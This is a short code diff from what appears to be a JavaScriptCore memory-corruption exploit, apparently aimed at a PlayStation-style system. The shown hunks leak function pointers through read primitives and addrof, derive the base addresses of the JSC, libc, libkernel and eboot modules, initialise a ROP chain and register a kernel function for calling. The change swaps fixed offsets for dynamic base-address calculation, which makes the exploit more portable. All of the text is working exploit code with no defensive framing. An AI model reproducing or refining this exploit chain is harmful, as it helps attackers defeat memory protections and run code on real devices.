@@ -152,7 +152,8 @@ debug(`native_executable_function: ${native_executable_function}`)
 const native_executable_constructor = mem.view(native_executable).getBigInt(0x48, true)
 debug(`native_executable_constructor: ${native_executable_constructor}`)
 
-const jsc_addr = native_executable_function.sub(0xC6380)
+// calculate jsc base using alignment instead of fixed offset
+const jsc_addr = utils.base_addr(native_executable_function)
 
 const _error_addr = mem.view(jsc_addr).getBigInt(0x1E72398, true)
 debug(`_error_addr: ${_error_addr}`)
@@ -160,7 +161,8 @@ debug(`_error_addr: ${_error_addr}`)
 const strerror_addr = mem.view(jsc_addr).getBigInt(0x1E723B8, true)
 debug(`strerror_addr: ${strerror_addr}`)
 
-const libc_addr = strerror_addr.sub(0x40410)
+// derive libc base from leaked function pointer
+const libc_addr = utils.base_addr(strerror_addr)
 
 const jsmaf_gc_addr = mem.addrof(jsmaf.gc)
 debug(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)
@@ -176,6 +178,7 @@ rop.init(jsc_addr)
 fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', ['bigint'], 'bigint')
 
 const libkernel_addr = utils.base_addr(_error_addr)
+// get eboot base address dynamically
 const eboot_addr = utils.base_addr(native_invoke_addr)
 
 log(`jsc address: ${jsc_addr}`)
